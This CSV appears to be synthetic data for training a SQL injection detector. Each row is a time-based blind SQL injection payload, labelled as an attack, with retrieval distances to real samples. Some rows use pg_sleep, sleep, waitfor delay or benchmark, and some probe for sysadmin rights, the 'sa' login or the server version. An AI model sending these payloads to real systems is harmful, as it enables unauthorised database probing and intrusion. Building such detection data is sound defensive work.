id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000098,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.464704875310778
CTGAN_000099,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.03211910526345
CTGAN_000100,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.393278429054395
CTGAN_000101,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,7.191632816514338
CTGAN_000102,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,10.019533663288637
CTGAN_000103,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.651057835318456
CTGAN_000104,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.733569610643249
CTGAN_000105,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.56432222982635
CTGAN_000106,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.3052054510281454
CTGAN_000107,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.726364072415513
CTGAN_000108,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.390132651613875
CTGAN_000109,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.455968093412025
CTGAN_000110,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.0349408965633335
CTGAN_000111,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.796447610404127
CTGAN_000112,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.306328031518098
CTGAN_000113,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.225554385029639
CTGAN_000114,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.5604964872069855
CTGAN_000115,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.523458433387738
CTGAN_000116,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,7.448645646755673
CTGAN_000117,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,3.461437226798531
CTGAN_000118,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.985697231464579
CTGAN_000119,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.815451472498413
CTGAN_000120,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.63909954759939
CTGAN_000121,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.308655208813432
CTGAN_000122,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.070189897532608
CTGAN_000123,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.426212935056788
CTGAN_000124,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,7.054138327438937
CTGAN_000125,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.362604458953028
CTGAN_000126,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.137245468297133
CTGAN_000127,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.185691532854155
CTGAN_000128,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.455428714189825
CTGAN_000129,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.478011470202228
CTGAN_000130,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.620227342813102
CTGAN_000131,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.643471652633563
CTGAN_000132,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.984730319315649
CTGAN_000133,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.622725071735645
CTGAN_000134,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.67461018441863
CTGAN_000135,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.463326028040379
CTGAN_000136,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.2198291558772025
CTGAN_000137,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,5.903649368100384
CTGAN_000138,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,7.304385018248599
CTGAN_000139,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,5.983117386752365
CTGAN_000140,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,8.441985048133903
CTGAN_000141,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,3.936097593033196
CTGAN_000142,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.571859828753111
CTGAN_000143,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.480306109248928
CTGAN_000144,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.525986530819462
CTGAN_000145,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.15607134294506
CTGAN_000146,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.0785852032031515
CTGAN_000147,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.012267498128355
CTGAN_000148,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.83724478741325
CTGAN_000149,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.514484350913087
CTGAN_000150,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.271563570927852
CTGAN_000151,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.212369908959197
CTGAN_000152,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.361569634179213
CTGAN_000153,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.23563710523131
CTGAN_000154,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,9.851550288032616
CTGAN_000155,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.5521373082641245
CTGAN_000156,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.062097133211905
CTGAN_000157,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.8122613809306
CTGAN_000158,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.268862996486798
CTGAN_000159,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.674442548234937
CTGAN_000160,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.3008116643127225
CTGAN_000161,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.40521918576578
CTGAN_000162,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.41141524799253
CTGAN_000163,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.010823588384978
CTGAN_000164,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.454402039991217
CTGAN_000165,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.612765552536414
CTGAN_000166,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.770988331665396
CTGAN_000167,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.774700911943801
CTGAN_000168,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.965466838938698
CTGAN_000169,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,8.140275258619786
CTGAN_000170,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.078210240141279
CTGAN_000171,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.1255326638921765
CTGAN_000172,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.395388619056118
CTGAN_000173,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,7.182718969747631
CTGAN_000174,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.855021228314145
CTGAN_000175,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.546788934371353
CTGAN_000176,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.323306495398181
CTGAN_000177,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.834687215675085
CTGAN_000178,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.711536231653876
CTGAN_000179,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.655706122521333
CTGAN_000180,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,7.0851562297651185
CTGAN_000181,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,8.767476659233745
CTGAN_000182,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,8.895340751130929
CTGAN_000183,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.753713860511483
CTGAN_000184,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.81427154972143
CTGAN_000185,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.489229446505295
CTGAN_000186,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,7.757547275130047
CTGAN_000187,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,4.524895361640481
CTGAN_000188,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.069701061172711
CTGAN_000189,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.272771408291465
CTGAN_000190,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.5306880835137
CTGAN_000191,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.931997598959913
CTGAN_000192,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.786061042375731
CTGAN_000193,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.872404912588087
CTGAN_000194,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.878451340772316
CTGAN_000195,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.293622961341683
CTGAN_000196,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,9.136223540029498
CTGAN_000197,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.529451957806866
CTGAN_000198,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.159583944518347
CTGAN_000199,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.705815096129276
CTGAN_000200,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.528730545769913
CTGAN_000201,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,8.294509762458732
CTGAN_000202,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.282300368688383
CTGAN_000203,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.328457579551754
CTGAN_000204,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.039986258346656
CTGAN_000205,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.8042848896967625
CTGAN_000206,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.931772052833304
CTGAN_000207,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.307698312568001
CTGAN_000208,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.038299070252631
CTGAN_000209,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.159341534945231
CTGAN_000210,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.591823180246409
